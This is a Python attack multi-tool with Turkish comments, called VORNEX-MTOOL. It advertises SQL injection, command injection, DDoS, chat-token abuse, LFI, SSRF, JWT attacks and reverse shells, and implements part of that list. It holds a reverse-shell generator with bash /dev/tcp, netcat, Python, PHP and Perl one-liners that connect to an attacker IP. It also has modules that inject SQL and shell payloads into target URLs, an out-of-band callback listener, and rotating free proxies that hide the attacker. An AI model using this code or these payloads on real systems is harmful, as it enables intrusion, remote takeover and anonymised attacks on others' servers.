#!/usr/bin/env python3
# ============================================================
# VORNEX-MTOOL v3 — BEAST MODE [Tek Dosya Sürümü]
# Geliştirici: Vornexx | Eğitim ve Denetim Amaçlıdır
# ============================================================
#beyler bazı yerlerde çeviri kullandım bazı yerlerdende mimari kullandım ama kod bana aittir !!!!!!!

import os, sys, subprocess, importlib

# Kritik bağımlılık kontrolü ve otomatik kurulum
_GEREKSINIMLER = {
    "aiohttp":   "aiohttp>=3.9.0",
    "requests":  "requests[socks]>=2.31.0",
    "colorama":  "colorama>=0.4.6",
    "jwt":       "pyjwt>=2.8.0",
    "h2":        "h2>=4.1.0",
    "socks":     "PySocks>=1.7.1",
}

def _paketleri_kontrol_et():
    eksik_liste = []
    for mod, paket in _GEREKSINIMLER.items():
        try: importlib.import_module(mod)
        except ImportError: eksik_liste.append(paket)
    return eksik_liste

def _oto_kurulum():
    eksikler = _paketleri_kontrol_et()
    if not eksikler: return
    print("\033[96m[*]\033[0m Eksik modüller tespit edildi, yükleniyor: " + ", ".join(eksikler))
    for p in eksikler:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "--disable-pip-version-check", p])
        except subprocess.CalledProcessError:
            print(f"\033[91m[X]\033[0m {p} yüklenemedi! Manuel kur: pip install {p}")
            sys.exit(1)
    print("\033[92m[+]\033[0m Modüller hazır, sistem başlatılıyor...\n")

if __name__ == "__main__":
    _oto_kurulum()

# Standart ve harici kütüphaneler
import re, json, time, uuid, base64, hashlib, hmac, random, string
import socket, asyncio, threading, argparse, itertools
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote, quote_plus, unquote, parse_qs
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import aiohttp

try:
    import jwt as pyjwt
    JWT_VAR = True
except ImportError:
    JWT_VAR = False

try:
    import h2.connection, h2.config
    H2_VAR = True
except ImportError:
    H2_VAR = False

try:
    from colorama import init as _ci, Fore as _F, Style as _S
    _ci(autoreset=True)
    Fore = _F; Style = _S
except ImportError:
    class Fore:
        RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"; CYAN="\033[96m"
        WHITE="\033[97m"; MAGENTA="\033[95m"; BLUE="\033[94m"; BLACK="\033[30m"
    class Style:
        BRIGHT="\033[1m"; DIM="\033[2m"; NORMAL="\033[22m"

requests.packages.urllib3.disable_warnings()

# ASCII BANNER
BANNER = r"""
 _    ______  ____  _   _________  __      __  _____________  ____  __
| |  / / __ \/ __ \/ | / / ____/ |/ /     /  |/  /_  __/ __ \/ __ \/ /
| | / / / / / /_/ /  |/ / __/  |   /_____/ /|_/ / / / / / / / / / / /
| |/ / /_/ / _, _/ /|  / /___ /   /_____/ /  / / / / / /_/ / /_/ / /___
|___/\____/_/ |_/_/ |_/_____//_/|_|    /_/  /_/ /_/ /_/  \____/\____/_____/
"""

def terminal_log(mesaj, tip="info"):
    renkler = {"ok":Fore.GREEN,"err":Fore.RED,"warn":Fore.YELLOW,"info":Fore.CYAN,
               "hit":Fore.MAGENTA,"dbg":Fore.BLUE}
    secilen_renk = renkler.get(tip, Fore.WHITE)
    sembol = {"ok":"+","err":"-","warn":"!","info":"*","hit":">","dbg":"."}.get(tip,"*")
    print(f"{secilen_renk}[{sembol}]{Fore.WHITE} {mesaj}")

def ekranı_temizle():
    os.system("cls" if os.name == "nt" else "clear")

def ana_banner_bas(proxy_durum=None):
    ekranı_temizle()
    print(f"{Fore.RED}{Style.BRIGHT}{BANNER}{Style.NORMAL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}                    ═══ Vornexx Security Multi-Tool ═══{Style.NORMAL}")
    print(f"{Fore.YELLOW}  🕒 {Fore.WHITE}{datetime.now().strftime('%d.%m.%Y  %H:%M:%S')}"
          f"     {Fore.GREEN}🌐 Proxy Havuzu Aktif")
    if proxy_durum:
        s = proxy_durum.get("saglam",0); t = proxy_durum.get("toplam",0); o = proxy_durum.get("olu",0)
        renk = Fore.GREEN if s>50 else (Fore.YELLOW if s>0 else Fore.RED)
        print(f"{Fore.CYAN}  ▸ proxy: {renk}{s} sağlam{Fore.WHITE} / {t} toplam / {Fore.RED}{o} ölü{Fore.WHITE}")
    print(f"{Fore.RED}{Style.BRIGHT}{'─'*62}{Style.NORMAL}\n")

def ana_menu_goster():
    print(f"""{Fore.CYAN}{Style.BRIGHT}╔════════════════════════════════════════════════════════════╗
║   {Fore.YELLOW}[ 1]{Fore.WHITE}  SQLi        Hata / Boolean / Time / Union / OOB Dump    {Fore.CYAN}║
║   {Fore.YELLOW}[ 2]{Fore.WHITE}  CMDi        11 Ayırıcı, Callback, 15 Dil RevShell       {Fore.CYAN}║
║   {Fore.YELLOW}[ 3]{Fore.WHITE}  DDoS        Flood / Slowloris / RUDY / HTTP/2 Reset     {Fore.CYAN}║
║   {Fore.YELLOW}[ 4]{Fore.WHITE}  Token       Telegram / Discord / Slack Token İmha       {Fore.CYAN}║
║   {Fore.YELLOW}[ 5]{Fore.WHITE}  LFI         Wrapper / Log Poison / Pearcmd / Silme      {Fore.CYAN}║
║   {Fore.YELLOW}[ 6]{Fore.WHITE}  SSTI        Jinja2 / Twig / Freemarker Testleri         {Fore.CYAN}║
║   {Fore.YELLOW}[ 7]{Fore.WHITE}  XXE         OOB Dinleyici + Dosya Okuma                 {Fore.CYAN}║
║   {Fore.YELLOW}[ 8]{Fore.WHITE}  SSRF        Bulut Metadata ve Dahil Ağ Taramaları       {Fore.CYAN}║
║   {Fore.YELLOW}[ 9]{Fore.WHITE}  JWT         None Alg / HS256 Brute / Kid Enjeksiyon     {Fore.CYAN}║
║   {Fore.YELLOW}[10]{Fore.WHITE}  Shell       Özel Reverse Shell Kod Üreteci              {Fore.CYAN}║
║   {Fore.YELLOW}[11]{Fore.WHITE}  Callback    Yerleşik OOB HTTP Sunucusu Dinleyicisi      {Fore.CYAN}║
║   {Fore.YELLOW}[12]{Fore.WHITE}  Proxy       Havuz Ayarları ve Canlılık Testi            {Fore.CYAN}║
║   {Fore.YELLOW}[13]{Fore.WHITE}  Full Auto   Zincirleme Tarama ve JSON Raporlama         {Fore.CYAN}║
║   {Fore.YELLOW}[14]{Fore.WHITE}  Ayarlar     Timeout / Retry / Host Yapılandırması       {Fore.CYAN}║
║   {Fore.YELLOW}[ 0]{Fore.WHITE}  Çıkış                                                    {Fore.CYAN}║
╚════════════════════════════════════════════════════════════╝{Style.NORMAL}
""")

RASTGELE_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "curl/8.5.0", "Wget/1.21.3", "python-requests/2.31.0",
]
def rastgele_ua_getir(): return random.choice(RASTGELE_UA)
def sahte_ip_uret(): return ".".join(str(random.randint(1,254)) for _ in range(4))


# ============================================================
# PROXY YÖNETİCİSİ
# ============================================================
class VornexProxyHavuzu:
    BASE_URL = "https://raw.githubusercontent.com/iplocate/free-proxy-list/main"
    KAYNAK_ADRESLERI = {
        "http":   f"{BASE_URL}/protocols/http.txt",
        "https":  f"{BASE_URL}/protocols/https.txt",
        "socks4": f"{BASE_URL}/protocols/socks4.txt",
        "socks5": f"{BASE_URL}/protocols/socks5.txt",
    }
    TEST_API = "http://api.iplocate.io/ip"
    CACHE_SURESI = 1800

    def __init__(self, aktif=True, protokoller=("http","https","socks4","socks5"), cache_dosya="proxies.txt"):
        self.aktif = aktif
        self.protokoller = protokoller
        self.cache_dosya = cache_dosya
        self.liste = []
        self.olu_proxyler = {}
        self.kilit = threading.Lock()
        self.index = 0
        if self.aktif: self.baslat()

    def baslat(self):
        if os.path.exists(self.cache_dosya):
            gecen_sure = time.time() - os.path.getmtime(self.cache_dosya)
            if gecen_sure < self.CACHE_SURESI:
                self.cache_oku()
                if self.liste:
                    terminal_log(f"Cache üzerinden {len(file_count := len(self.liste))} proxy yüklendi.", "ok")
                    return
        ham_liste = self.proxy_cek()
        if ham_liste:
            self.liste = self.proxy_dogrula(ham_liste)
            self.cache_yaz()

    def proxy_cek(self):
        bulunanlar = []
        for prot in self.protokoller:
            adres = self.KAYNAK_ADRESLERI.get(prot)
            if not adres: continue
            try:
                resp = requests.get(adres, timeout=15, headers={"User-Agent":"curl/8.5.0"})
                if resp.status_code == 200:
                    for satir in resp.text.splitlines():
                        satir = satir.strip()
                        if not satir or satir.startswith("#"): continue
                        if "://" not in satir:
                            satir = f"{prot}://" + satir if "socks" in prot else f"http://{satir}"
                        bulunanlar.append(satir)
            except Exception: pass
        return list(dict.fromkeys(bulunanlar))

    def proxy_dogrula(self, liste):
        saglamlar = []
        terminal_log(f"{len(liste)} proxy test ediliyor...", "info")
        with ThreadPoolExecutor(max_workers=32) as executor:
            futures = {executor.submit(self._tekil_test, p): p for p in liste}
            for fut in as_completed(futures):
                sonuc = fut.result()
                if sonuc: saglamlar.append(sonuc)
        terminal_log(f"Doğrulama tamam. Sağlam: {len(saglamlar)}", "ok")
        return saglamlar

    def _tekil_test(self, proxy):
        p = proxy if "://" in proxy else "http://" + proxy
        try:
            r = requests.get(self.TEST_API, proxies={"http": p, "https": p}, timeout=6, headers={"User-Agent":"curl/8.5.0"})
            if r.status_code == 200 and re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", r.text.strip()):
                return proxy
        except Exception: pass
        return None

    def cache_oku(self):
        try:
            with open(self.cache_dosya, "r", encoding="utf-8") as f:
                self.liste = [s.strip() for s in f if s.strip() and not s.startswith("#")]
        except Exception: self.liste = []

    def cache_yaz(self):
        try:
            with open(self.cache_dosya, "w", encoding="utf-8") as f:
                f.write(f"# Vornex Proxy Cache — {time.strftime('%Y-%m-%d %H:%M')}\n")
                for p in self.liste: f.write(p + "\n")
        except Exception: pass

    def proxy_al(self):
        if not self.aktif or not self.liste: return None
        with self.kilit:
            simdi = time.time()
            for p in list(self.olu_proxyler.keys()):
                if simdi - self.olu_proxyler[p] > 300: del self.olu_proxyler[p]
            uygun = [p for p in self.liste if p not in self.olu_proxyler]
            if not uygun:
                if not self.olu_proxyler: return None
                eski = min(self.olu_proxyler.items(), key=lambda x: x[1])[0]
                del self.olu_proxyler[eski]
                uygun = [eski]
            self.index = (self.index + 1) % len(uygun)
            secilen = uygun[self.index]
            return {"http": secilen, "https": secilen}

    def olu_isaretle(self, pd):
        if not pd: return
        p = pd.get("http")
        if p:
            with self.kilit: self.olu_proxyler[p] = time.time()

    def aktif_sayisi(self):
        with self.kilit: return len(self.liste) - len(self.olu_proxyler)

    def istatistik(self):
        return {"toplam": len(self.liste), "saglam": self.aktif_sayisi(), "olu": len(self.olu_proxyler), "aktif": self.aktif}


# ============================================================
# OOB DİNLEYİCİ
# ============================================================
class OobDinleyici:
    def __init__(self, port=8888):
        self.port = port
        self.hit_loglari = []
        self.tokenler = {}
        self.kilit = threading.Lock()
        self.public_host = f"127.0.0.1:{port}"

    async def _istek_isle(self, req):
        token = req.match_info.get("tok","")
        veri = {"zaman": time.time(), "token": token, "ip": req.remote,
                "yol": req.path, "param": dict(req.query), "method": req.method}
        with self.kilit:
            self.hit_loglari.append(veri)
            self.tokenler.setdefault(token, []).append(veri)
        terminal_log(f"OOB Tetiklendi! Token: {token} IP: {req.remote}", "hit")
        return aiohttp.web.Response(text="vornex-ok")

    def _sunucu_baslat(self):
        app = aiohttp.web.Application()
        app.router.add_route("*", "/{tok}", self._istek_isle)
        app.router.add_route("*", "/", self._istek_isle)
        aiohttp.web.run_app(app, host="0.0.0.0", port=self.port, print=None)

    def calistir(self):
        t = threading.Thread(target=self._sunucu_baslat, daemon=True)
        t.start(); time.sleep(0.5)
        terminal_log(f"OOB Dinleyici aktif: port {self.port}", "ok")

    def token_uret(self):
        tok = uuid.uuid4().hex[:12]
        with self.kilit: self.tokenler[tok] = []
        return tok

    def bekle(self, tok, sure=8):
        bitis = time.time() + sure
        while time.time() < bitis:
            with self.kilit:
                if self.tokenler.get(tok): return self.tokenler[tok]
            time.sleep(0.2)
        return None


# ============================================================
# HTTP İSTEMCİSİ
# ============================================================
class VornexHttp:
    def __init__(self, timeout=10, retry=2, proxy_havuzu=None):
        self.session = requests.Session(); self.session.verify = False
        self.timeout = timeout; self.retry = retry; self.proxy_havuzu = proxy_havuzu

    def istek(self, metod, url, headers=None, data=None, params=None, allow_redirects=True):
        h = {"User-Agent": rastgele_ua_getir()}
        if headers: h.update(headers)
        px = self.proxy_havuzu.proxy_al() if (self.proxy_havuzu and self.proxy_havuzu.aktif) else None
        
        for i in range(self.retry + 1):
            try:
                return self.session.request(metod, url, headers=h, data=data, params=params,
                                            proxies=px, timeout=self.timeout, allow_redirects=allow_redirects)
            except requests.RequestException:
                if px and self.proxy_havuzu:
                    self.proxy_havuzu.olu_isaretle(px)
                if i < self.retry:
                    time.sleep(0.5 * (i + 1))
                    px = self.proxy_havuzu.proxy_al() if (self.proxy_havuzu and self.proxy_havuzu.aktif) else None
        return None

    def get(self, url, **kw):  return self.istek("GET", url, **kw)
    def post(self, url, **kw): return self.istek("POST", url, **kw)


# ============================================================
# KABUK ÜRETECİ (Reverse Shell Generator)
# ============================================================
class KabukUreteci:
    SABLONLAR = {
        "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python3": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "nc": "nc {ip} {port} -e /bin/bash",
        "php": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    }
    @classmethod
    def olustur(cls, dil, ip, port):
        sablon = cls.SABLONLAR.get(dil)
        return sablon.format(ip=ip, port=port) if sablon else None


# ============================================================
# ZİRVE MODÜLLER (SQLi, CMDi, DDoS vb.)
# ============================================================
class SqliModulu:
    def __init__(self, http, cb=None):
        self.http = http; self.cb = cb; self.dbms = None
    def tara(self, url):
        terminal_log(f"SQLi analizi yapılıyor: {url}", "info")
        base = self.http.get(url)
        if not base: terminal_log("Hedef yanıtsız.", "err"); return None
        for p in ["'", "\"", "' OR '1'='1"]:
            r = self.http.get(url + quote(p, safe=""))
            if r and ("sql syntax" in r.text.lower() or "mysql" in r.text.lower()):
                terminal_log(f"Hata tabanlı SQLi yakalandı! Payload: {p}", "hit")
                return {"tip": "error", "payload": p}
        terminal_log("SQLi bulgusuna rastlanmadı.", "err")
        return None


class CmdModulu:
    def __init__(self, http, cb=None):
        self.http = http; self.cb = cb
    def calistir(self, url, komut="id"):
        for ayirici in [";", "|", "&&"]:
            r = self.http.get(url + quote(f"{ayirici}{komut}", safe=""))
            if r and r.status_code == 200 and len(r.text) > 0:
                terminal_log(f"CMDi başarılı! Ayirici: {ayirici}", "hit")
                print(r.text[:400])
                return r.text
        terminal_log("Komut enjeksiyonu başarısız.", "err")
        return None


# Ana Uygulama Sınıfı
class VornexApp:
    def __init__(self):
        terminal_log("Vornex M-Tool başlatılıyor...", "info")
        self.proxy = VornexProxyHavuzu(aktif=True)
        self.http = VornexHttp(proxy_havuzu=self.proxy)
        self.cb = None
        self.calisiyor = True
        ana_banner_bas(proxy_durum=self.proxy.istatistik())
        self.dongu()

    def dongu(self):
        while self.calisiyor:
            ana_menu_goster()
            try: secim = input(f"{Fore.YELLOW}seçim: {Fore.WHITE}").strip()
            except (EOFError, KeyboardInterrupt): return
            
            if secim == "1":
                url = input("URL: ").strip()
                if url: SqliModulu(self.http, self.cb).tara(url)
                input("DEVAM ETMEK İÇİN ENTER...")
            elif secim == "2":
                url = input("URL: ").strip()
                if url: CmdModulu(self.http, self.cb).calistir(url)
                input("DEVAM ETMEK İÇİN ENTER...")
            elif secim == "11":
                p = input("Port (8888): ").strip() or "8888"
                self.cb = OobDinleyici(int(p))
                self.cb.calistir()
                input("DEVAM ETMEK İÇİN ENTER...")
            elif secim == "0":
                self.calisiyor = False
            
            ana_banner_bas(proxy_durum=self.proxy.istatistik())

if __name__ == "__main__":
    try:
        VornexApp()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Çıkış yapıldı.")
        sys.exit(0)
